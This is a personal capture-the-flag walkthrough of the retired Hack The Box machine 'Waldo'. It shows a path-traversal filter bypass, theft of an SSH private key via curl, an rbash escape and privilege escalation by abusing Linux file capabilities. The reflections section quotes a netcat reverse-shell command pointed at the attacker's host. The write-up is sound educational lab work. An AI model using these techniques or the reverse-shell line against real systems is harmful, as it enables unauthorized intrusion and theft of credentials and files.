Waldo is a fun box from the HTB retired list. Its one of my favourites!

`nmap -sV -Pn 10.10.10.87`

```

Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-25 05:15 EST
Nmap scan report for 10.10.10.87
Host is up (0.099s latency).

```

A quick scan shows three ports, one of which is filtered.

Starting with port 80 then...

We get a page which has a "Where's Waldo" background, It seems to be a page where we can create and manage lists.


![waldo1](/assets/img/waldo/waldo1.png)



We can see what requests are being made in Burp.


![waldo2](/assets/img/waldo/waldo2.png)

It generates a request to dirRead.php which sends the path parameter `path=` in the POST request body.
This looks likely to be vulnerable to a directory traversal.

POST requests are made to pages “dirRead.php”, “fileWrite.php” and “fileRead.php”

![waldo-post](/assets/img/waldo/waldo-post.png)

Looking at the POST request to fileRead.php we find that it is similarly vulnerable.

![waldo-fileRead](/assets/img/waldo/waldo-fileRead.png)


Abusing the inclusion of `fileRead.php` we can hopefully get to read these php files.

I send the POST request to fileRead.png to burp's `repeater` and change the parameter `file=` to `file=fileRead.php`

![fileRead-contents](/assets/img/waldo/waldo-fileRead-contents.png)


It shows that there's some filters in place to prevent traversal, and reading user.txt.
The dotdotslash ../ means to traverse directories is filtered out, but it's an easy thing to bypass in this case.
This can be achieved by using` ....//` which when `../` is filtered out will leave `../`


I send the POST request to dirRead.php to burp's `repeater` and change the parameter `list=` to read `list=./....//` and get a positive response:

```

[".","..","html","localhost"]

```

I continue going back directories by adding more till I'm able to view the /etc directory.

![waldo-etc-dir](/assets/img/waldo/waldo-etc-dir.png)


Switching now to the POST request of fileRead.php again, I attempt to read /etc/passwd

![waldo-etc-passwd](/assets/img/waldo/waldo-etc-passwd.png)

we can successfully read /etc/passwd....so what else can we find?

Browsing Waldo's directories in this manner I find the user `nobody`'s home directory, and the file `.monitor` in the `.ssh` directory,
which is a private RSA key...

![waldo-nobody-rsa](/assets/img/waldo/waldo-nobody-rsa.png)

The format however is not going to work with a copypaste, and the 'beautifier' extension is of no real help.

I right-click the POST requset side of the `repeater` and copy the request as a curl command.

```

curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.87' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.87/list.html' -H $'Content-type: application/x-www-form-urlencoded' -H $'Content-Length: 49' -H $'Connection: close' \
    --data-binary $'file=/....//....//....//home/nobody/.ssh/.monitor\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a' \
    $'http://10.10.10.87/fileRead.php'

```

I copy the response minus the headers to a file `id_rsa`

Using `cut` and `sed` I can format this file properly...

It took a while of playing around to get it right...I checked my progress by using the `tee` command
which prints to stdout as well as to file.


```

cat id_rsa | cut -d "\"" -f 4 | sed 's/\\n/\n/g' | sed 's/\\//g' |tee rsa_key

```

Finally got the right format.


```

```

Trying to gain access via ssh failed the first time, because I forgot to change the file permissions.

`chmod 600 rsa_key` fixes the problem.

Eventually I login via ssh to user nobody.

![waldo-ssh-access](/assets/img/waldo/waldo-ssh-access.png)

Got the user.txt flag...

```

waldo:~$ cat user.txt
32xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx24
waldo:~$

<h3>Privilege Escalation</h3>




`sudo -l` returns the information that sudo is not installed.

`find / -perm -u=s -type f 2>/dev/null` returns very little...

```

/usr/bin/passwd
/usr/bin/chage
/usr/bin/expiry
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd

```

The ssh welcome message gives us a link to the [Alpine Linux Wiki](https://wiki.alpinelinux.org/wiki/Main_Page)
It seems to be a light-weight security orientated linux distro.


Having a poke around, I notice something interesting in the `/` folder.

![waldo-dockerenv](/assets/img/waldo/waldo-dockerenv.png)
Maybe Waldo is hosting a docker container? Am I in the container?


Something else interesting caught my eye when I did `netstat -antup`

![waldo-netstat-antup](/assets/img/waldo/waldo-netstat-antup.png)

We used ssh to access the target, but our connection seems to be on the port 8888 we saw as filtered earlier?
We can also see localhost active, and listening on port 9000. We came across a `localhost` folder earlier in the directory traversal...it appeared empty...


Something strange is going on here!!!


Looking again inside the .ssh folder in nobody's home directory...

```

waldo:~/.ssh$ cat known_hosts
localhost ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMsMoPYC4gQXgpVm2SlVUPuagi1mP6V4l5zynWW5f2CogESxxB/uWRLnTMjVdqL279PojOB+3n5iXLAB2sg1Bho=

```


Localhost is included as a known host here...maybe we can connect to localhost via ssh...
Using .monitor as the rsa key, and monitor as the username works.


`ssh -i .monitor monitor@localhost`


![waldo-heres-waldo](/assets/img/waldo/waldo-heres-waldo.png)

Found you!

But we're stuck in a restricted bash shell...

```

Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
-rbash: alias: command not found

```
The shell is very restricted, we cant change directories, cant escape with python, or use many of the normal bash commands like `cat` or `which`...
I've encountered this scenario previously, I remember using ssh with a `--noprofile` flag but couldn't remember the exact command.
A quick google search (well duckduckgo actually) using the terms `ssh bash noprofile`  and I found something...
Adding `-t` to the command can force ssh to use any tty shell.

`ssh -i .monitor monitor@localhost -t sh`

It worked, its not the same command as the one I vaguely recall, but at least now I'm able to work freely.

Trying `python -c 'import pty;pty.spawn("/bin/bash")'` puts me back into the rbash environment, so I exit back to `sh`.

<hr width="250" size="6">

Browsing `monitor`'s home directory, we find a folder called `app-dev` which contains a program which reads information from some log files...

![waldo-logMonitorc](/assets/img/waldo/waldo-logMonitorc.png)

Looks ok to run, I try each flag in turn to read the relevant logs...

The only ones that seem to work are the -w and -h flags, the rest fail `Cannot open file`.
The problem is likely to do with file permissions, only root can read those files...???

In the folder there seems to be an earlier version of the file, maybe that one is somehow exploitable...

This version does seem to work.

![logmonworks](/assets/img/waldo/waldo-logmonworks.png)

<h4>Why? and how can I exploit it?</h4>

Looking for suid files earlier gave scant return, and this file wasn't on the list, and there's no sudo to abuse...

This really did have me stumped for a while.

I resisted the temptation to peek at a walkthrough for the box (I had time, and was enjoying this), and did some research.

I duckduckgo'd (doesn't have quite the same ring to it) `superuser permissions without sudo` and StackExchange came to my rescue!

[this page](https://unix.stackexchange.com/questions/172329/how-to-execute-a-command-that-requires-root-permission-without-sudo) gave hints about linux 'capabilities' and a helpful [link](https://linux.die.net/man/7/capabilities) to a page which explained them.

I wanted something I could ingest more readily, so googled (you know what I mean) `linux capabilities`

[this page](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux_atomic_host/7/html/container_security_guide/linux_capabilities_and_seccomp) explained things nicely.

as did [this page](https://wiki.archlinux.org/index.php/Capabilities).

<hr width="250" size="6">

Now I had a fair idea of what I was dealing with, the next step was finding out how 'capabilities' could be exploited.

[this page](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) by Raj Chandel came up trumps. I've found his blogs very useful and informative in the past, and he set it out nicely again.

`getcap -r / 2>/dev/null` did nothing...

```

$ getcap logMonitor-0.1
sh: 62: getcap: not found

```

`which getcap` did nothing...

`man getcap` did give me the man page for getcap, so I know it's there somewhere.

```

$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/games

```

The path is still restricted, this is likely to be the root cause of my frustration.

I copied the path on my machine and exported it to Waldo...

```

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go/bin

```

The `getcap` commands worked this time.

![getcap](/assets/img/waldo/waldo-getcap.png)

Great! 

The output for the `getcap -r / 2>/dev/null` command shows another binary with the same capabilities...

```

/usr/bin/tac = cap_dac_read_search+ei

```

`man tac` reveals that tac reads files in reverse (last line first)
This too can read root files.......hmmmm!

```

$ /usr/bin/tac /root/root.txt
8fxxxxxxxxxxxxxxxxxxxxxxxxxxxx6c

```


<h3>Postscript / Reflections</h3>

I know that this box could have been exploited quicker and slicker.

I decided to check out some other HTB Walkthroughs to see how others achieved the root flag, what they did differently or better, and if anyone got a root shell.
Since this is a 'Capture The Flag' environment, it's essentially a smash and grab for the flag, and the systematic enumeration and analysis of a full 'Penetration Test' is not neccessary; but it would be nice to learn from other walkthroughs about the target, and how my approach could improve.

I check out [0xdf's walkthrough](https://0xdf.gitlab.io/2018/12/15/htb-waldo.html), his high level of experience always makes for good learning.
His use of `curl` and particularly `jq` to beautify the responses is brilliant. I've used curl plenty, I've also used jq; but didn't have the same vision to use them in conjuction in this instance.
I replicated his technique and marvelled at it's simplicity, especially it's effective formatting of the private RSA key.

It's definately something I will not forget.

<hr width="250" size="6">

I also find out that my means of getting monitor's unrestricted shell was the 'unintended route'. 0xdf points to the other folder in nobody's home directory.
I'd looked in there, but realise I didnt explore its contents at all. He uses the `red` (restricted 'ed' text editor) to get a full shell.
He does mention the use of `-t` in the ssh command as I used, and quickly exports his `PATH` to make the shell fully functional, something that took me a while to figure out.


[The infosecinstitute walkthrough](https://resources.infosecinstitute.com/hack-the-box-htb-walkthrough-waldo/) is much the same, though I find the site horrible to use. It does however remind me of the ssh command I couldn't quite remember...

```

ssh -i .monitor monitor@localhost -t "bash -noprofile"

```

I'd picked this up previously, and won't forget it again, although it wouldn't have helped me any more than the command I eventually used.

[Jack Barradell-Johns](https://blog.barradell-johns.com/index.php/2019/10/16/htb-waldo/) has a more readable walthrough than infosecinstitute, but like them doesn't show how he reformatted the private RSA key. He also uses the -noprofile flag in his ssh command.

[BAS Infosec Blog](https://www.baslub.nl/htb-waldo/) by L4MPJE has a good walkthrough, dark theme (I feel so unoriginal!) and very readable. He also uses `sed` and `cut` to reformat the RSA key as I did...but achieves it in a single command which pipes the output from a curl command, formats the text, redirects output to file, and changes file permissions....impressive!

```

curl -s -X POST http://10.10.10.87/fileRead.php --data "file=..././..././..././..././..././home/nobody/.ssh/.monitor" | cut -d "\"" -f 4 | sed 's/\\n/\n/g' | sed 's/\\//g' > nobody.key && chmod 600 nobody.key

```

He also uses the "bash -noprofile" argument for the ssh command...but ommits the `-t`. The result is that he loses the bash prompt, but recovers it with the python pty.spawn command.
L4MPJE too, spots the need to export a new $PATH much earlier than myself.


George O's writeup on [Medium.com](https://medium.com/ctf-writeups/waldo-write-up-htb-dfbaaaa91282) contains a great python script the author wrote to exploit the directory traversal and file disclosure vulnerabilities on the box...It's well worth checking out!
He also uses a nifty way of getting monitor's bash shell, by directing the ssh traffic through netcat...back to his kali box...

```

ssh monitor@127.0.0.1 -i .monitor nc 10.10.15.1 4444 -e /bin/bash

```

[Jai Minton](https://www.jaiminton.com/HTB/Waldo/#) has an interesting writeup. He uses a PHP script to reformat the private RSA key. He also escapes the rbash shell the intended way! 

<hr width="250" size="6">

On the whole Im pretty pleased with my effort; I've learned a few things. I'll recognize that I'm in a docker container faster next time, I'll know how to identify linux file capabilities, and that use of curl piping output through jq is going in my back pocket!
A very enjoyable box; big thanks to its makers for the experience!!!

:D
